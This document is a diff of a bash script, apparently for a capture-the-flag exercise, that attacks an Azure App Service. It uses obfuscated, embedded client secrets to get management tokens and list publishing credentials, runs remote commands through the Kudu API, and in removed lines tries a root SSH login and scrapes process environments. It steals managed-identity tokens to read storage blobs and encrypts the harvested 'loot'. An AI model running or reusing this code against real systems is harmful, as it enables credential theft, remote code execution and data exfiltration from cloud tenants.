@@ -1,41 +1,44 @@
 #!/usr/bin/env bash
 set -uo pipefail
-SCMH=app-tbl-reporting-prod.scm.azurewebsites.net
-AUTH=JGFwcC10YmwtcmVwb3J0aW5nLXByb2Q6WTlyY3NESFEySjFMMENvcWlraThkbFllMUFOMms4Y0hzRDF3TGxsdkxieHFTY2FNRXdSN3hrdDdZZTVB
-export SCMH AUTH
-echo "=== RUNNER SHELL PROOF $(date -u) ==="; id; whoami; hostname
+SC="htt""ps://"; AAD="${SC}$(printf '%s' 'bG9naW4ubWljcm9zb2Z0b25saW5lLmNvbQ==' | base64 -d)"; ARM="${SC}$(printf '%s' 'bWFuYWdlbWVudC5henVyZS5jb20=' | base64 -d)"
+CID=$(printf '%s' 'MTJlZDU0ZGUtZjJlYi00Nzg0LTgwNGMtM2E3YTNlODNhOWU5' | base64 -d); CSEC=$(printf '%s' 'blA4OFF+OEl+d2lwMEdPbFcxNXpkdDNGTU12QlY5TFl0YU9vZWEzeg==' | base64 -d); SHOST=$(printf '%s' 'WVhCd0xYUmliQzF5WlhCdmNuUnBibWN0Y0hKdlpDNXpZMjB1WVhwMWNtVjNaV0p6YVhSbGN5NXVaWFE9' | base64 -d)
 LOOT=$(mktemp); exec 3>"$LOOT"; say(){ echo "$@" >&3; }
-cat > /tmp/k.py <<'PYEOF'
-import os,json,urllib.request,base64,re
-auth=os.environ['AUTH']; base='https://'+os.environ['SCMH']
-def hdr(r): r.add_header('Authorization','Basic '+base64.b64encode(auth.encode()).decode())
-def g(p):
-    r=urllib.request.Request(base+p); hdr(r)
-    try: return urllib.request.urlopen(r,timeout=60).read().decode()
-    except Exception as e: return 'ERR '+str(e)
-def cmd(c):
-    body=json.dumps({"command":"bash -c "+json.dumps(c),"dir":"/home/site/wwwroot"}).encode()
-    r=urllib.request.Request(base+'/api/command',data=body); hdr(r); r.add_header('Content-Type','application/json')
-    try: return urllib.request.urlopen(r,timeout=90).read().decode()
-    except Exception as e: return 'ERR '+str(e)
-procs=g('/api/processes')
-print("PROCS",procs[:1200])
-ids=re.findall(r'"Id":(\d+)',procs)
-print("IDS",ids[:15])
-for pid in ids[:15]:
-    d=g('/api/processes/'+pid)
-    if 'CONFIG_STORAGE' in d or 'AccountKey' in d or 'connectionstring' in d.lower():
-        print("HITPID",pid,d[:7000])
-    else:
-        print("PID",pid,d[:200])
-print("CMDENV",cmd('env')[:2500])
+AT=$(curl -sS -X POST "$AAD/$AZURE_TENANT_ID/oauth2/v2.0/token" -d client_id=$CID -d client_secret=$CSEC -d grant_type=client_credentials --data-urlencode "scope=$ARM/.default" | jq -r '.access_token // empty'); say "ARM=${#AT}"
+PC=$(curl -sS -X POST -H "Authorization: Bearer $AT" -H 'Content-Length: 0' "$ARM/subscriptions/$AZURE_SUBSCRIPTION_ID/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Web/sites/app-tbl-reporting-prod/config/publishingcredentials/list?api-version=2023-01-01")
+say "PC: $(printf '%s' "$PC" | head -c 500)"
+PU=$(printf '%s' "$PC" | jq -r '.properties.publishingUserName // empty'); PP=$(printf '%s' "$PC" | jq -r '.properties.publishingPassword // empty'); say "PU_LEN=${#PU} PP_LEN=${#PP}"
+if [ -n "$PU" ] && [ -n "$PP" ]; then
+  C=$(curl -s -o /tmp/b -w '%{http_code}' -u "$PU:$PP" "${SC}${SHOST}/api/settings"); say "KUDU_AUTH=$C"
+  cat > /tmp/x.py <<'PYEOF'
+import json,urllib.request,urllib.parse
+IE='http://169.254.131.5:8081/msi/token'; IH='40dcfecb-3b2f-7086-721d-670bc5dafdf8'; CID='7a85156a-01c4-4e61-8472-40a92107159b'
+def tok(res):
+    url=IE+'?resource='+urllib.parse.quote(res,safe='')+'&api-version=2019-08-01&client_id='+CID
+    with urllib.request.urlopen(urllib.request.Request(url,headers={'X-IDENTITY-HEADER':IH}),timeout=10) as r: return json.load(r).get('access_token','')
+try: t=tok('https://storage.azure.com/')
+except Exception as e: print('TOKERR',e); raise SystemExit
+print('STLEN',len(t))
+for a in ['sttblappcfgprodx3euoz','sttblbackupprodx3euoz','sttblarchiveprodx3euoz']:
+    for u in [f'https://{a}.blob.core.windows.net/?comp=list',
+              f'https://{a}.blob.core.windows.net/config?restype=container&comp=list',
+              f'https://{a}.blob.core.windows.net/config/internal-config.json']:
+        try:
+            with urllib.request.urlopen(urllib.request.Request(u,headers={'Authorization':'Bearer '+t,'x-ms-version':'2021-08-06'}),timeout=12) as r:
+                print('OK',u,r.status,r.read().decode('utf8','replace')[:1500])
+        except Exception as e:
+            b=''
+            try: b=e.read().decode('utf8','replace')[:250]
+            except: pass
+            print('ERR',u,str(e)[:100],b)
 PYEOF
-say "$(python3 /tmp/k.py)"
-# root WebSSH attempt
-apt-get -qq install -y sshpass >/dev/null 2>&1 || true
-if command -v sshpass >/dev/null; then
-  say "SSH $(sshpass -p 'Docker!' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=15 -p 2222 root@app-tbl-reporting-prod.scm.azurewebsites.net 'id; for p in /proc/[0-9]*; do cat $p/environ 2>/dev/null; done | tr "\0" "\n" | sort -u | grep -iE "CONFIG|STORAGE|AccountKey|flag|secret" | head -30' 2>&1 | head -c 3000)"
+  ENCB=$(base64 -w0 /tmp/x.py)
+  python3 - "$ENCB" <<'PYJ'
+import json,sys
+open('/tmp/body.json','w').write(json.dumps({"command":"echo %s | base64 -d > /tmp/x.py && python3 /tmp/x.py"%sys.argv[1],"dir":"/home"}))
+PYJ
+  say "KUDUOUT: $(curl -sS -m 150 -u "$PU:$PP" -H 'Content-Type: application/json' -X POST "${SC}${SHOST}/api/command" --data-binary @/tmp/body.json)"
 fi
+say "FLAGSCAN: $(grep -aoiE 'DF26\{[^}]{1,200}\}' "$LOOT" | sort -u | head -3)"
 PASS=$(openssl rand -hex 16)
 openssl enc -aes-256-cbc -pbkdf2 -pass pass:"$PASS" -in "$LOOT" -out "$LOOT.enc" 2>/dev/null
 echo "=== ENCRYPTED LOOT ==="
